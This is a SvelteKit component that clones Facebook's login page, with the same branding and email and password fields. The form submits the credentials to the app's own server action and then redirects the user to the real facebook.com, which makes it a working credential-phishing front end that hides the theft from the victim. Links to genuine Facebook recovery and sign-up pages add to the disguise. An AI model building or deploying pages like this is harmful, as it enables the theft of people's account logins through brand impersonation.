<script lang="ts">
  import { Button } from "$lib/components/ui/button";
  import * as Card from "$lib/components/ui/card";
  import * as Form from "$lib/components/ui/form";
  import { Input } from "$lib/components/ui/input";
  import { Separator } from "$lib/components/ui/separator";
  import { signInSchema } from "$lib/schema";
  import Icon from "@iconify/svelte";
  import { preventDefault } from "svelte/legacy";
  import {
    superForm,
    type Infer,
    type SuperValidated,
  } from "sveltekit-superforms";
  import { zodClient } from "sveltekit-superforms/adapters";

  interface Props {
    data: {
      form: SuperValidated<Infer<typeof signInSchema>>;
    };
  }

  let { data }: Props = $props();
  const { form: signInForm } = $state(data);
  const form = superForm(signInForm, {
    validators: zodClient(signInSchema),
    onUpdate(event) {
      if (event.result.status === 200)
        window.location.href = "https://web.facebook.com";
    },
  });

  const { form: formData, enhance, delayed } = $derived(form);
</script>

<div
  class="min-h-screen bg-gray-100 flex items-center justify-between container px-48 gap-28"
>
  <div class="w-2/3 flex items-start justify-start flex-col">
    <p class="text-blue-600 text-center text-6xl font-bold">facebook</p>
    <p class="font-medium text-3xl">
      Connect with friends and the world around you on Facebook.
    </p>
  </div>

  <div class="flex items-center justify-center flex-col gap-4">
    <Card.Root class="w-screen max-w-sm shadow-md ">
      <!-- <Card.Header>
      <Card.Title>
      </Card.Title>
    </Card.Header> -->
      <Card.Content>
        <form method="POST" use:enhance action="?/sign" class="grid gap-4">
          <Form.Field {form} name="email">
            <Form.Control>
              {#snippet children({ props })}
                <Input
                  {...props}
                  placeholder="Email or Phone number"
                  bind:value={$formData.email}
                />
              {/snippet}
            </Form.Control>
          </Form.Field>
          <Form.Field {form} name="password">
            <Form.Control>
              {#snippet children({ props })}
                <Input
                  {...props}
                  type="password"
                  placeholder="Password"
                  bind:value={$formData.password}
                />
              {/snippet}
            </Form.Control>
          </Form.Field>
          <Form.Button
            class="bg-blue-600 hover:bg-blue-700 font-semibold text-base"
            size={"lg"}
          >
            Login
            {#if $delayed}
              <Icon icon="tabler:loader" class="animate-spin size-6 ms-2" />
            {/if}
          </Form.Button>
          <a
            href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
            class="capitalize text-sm font-semilight text-center text-blue-500 hover:text-blue-600 hover:underline"
            >forget password ?</a
          >
        </form>
      </Card.Content>
      <Card.Footer class="flex flex-col gap-4">
        <Separator />
        <Button
          class="bg-green-500 hover:bg-green-700 text-base font-semibold"
          size={"lg"}
          href={"https://web.facebook.com/r.php"}
        >
          Create New Account
        </Button>
      </Card.Footer>
    </Card.Root>

    <div class="font-light text-sm">
      <a
        href="https://web.facebook.com/pages/create/?ref_type=registration_form"
        class="font-semibold hover:underline transition-all">Create a Page</a
      > for a celebrity, brand or business
    </div>
  </div>
</div>
